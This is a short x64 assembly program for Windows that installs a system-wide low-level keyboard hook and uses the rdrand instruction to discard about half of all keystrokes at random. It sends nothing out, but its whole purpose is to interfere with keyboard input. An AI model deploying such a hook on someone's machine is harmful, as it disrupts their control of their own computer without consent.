bits 64
default rel

%define STACK_SIZE 8+32

global main

section .data

section .bss
	;keyboard_state resb 256
	msg resq 6
	hhook resq 1
	handle resq 1

section .text
	extern GetMessageW
	extern TranslateMessage
	extern DispatchMessageW
	extern SetWindowsHookExW
	extern UnhookWindowsHookEx
	extern CallNextHookEx
	extern GetModuleHandleW
	extern ExitProcess
	;extern GetKeyboardState

main:

	sub rsp, STACK_SIZE
	call sethook
	
	xor ecx, ecx
	call ExitProcess


proc:

	sub rsp, STACK_SIZE
	test ecx, ecx

	js .call_next

.retry:

	rdrand rax
	jnc .retry
	test al, 1
	jz .call_next

	mov eax, 1
	add rsp, STACK_SIZE
	
	ret

.call_next:

	mov r9, r8
	mov r8, rdx
	mov rdx, rcx
	mov rcx, [hhook]
		
	call CallNextHookEx

	add rsp, STACK_SIZE
	ret

sethook:

	sub rsp, STACK_SIZE

	xor rcx, rcx
	call GetModuleHandleW

	mov [handle], rax

	mov rcx, 13
	lea rdx, [proc]
	mov r8, [handle]
	mov r9, 0

	call SetWindowsHookExW
	mov [hhook], rax

	test rax, rax
	jz exit

.loop:

	lea rcx, [msg]
	xor rdx, rdx
    xor r8, r8
    xor r9, r9
	call GetMessageW

	test rax, rax
	jz exit

	lea rcx, [msg]
    call TranslateMessage
    lea rcx, [msg]
    call DispatchMessageW
	
	jmp .loop

exit:

	mov rcx, [hhook]
	call UnhookWindowsHookEx

	add rsp, STACK_SIZE
	ret
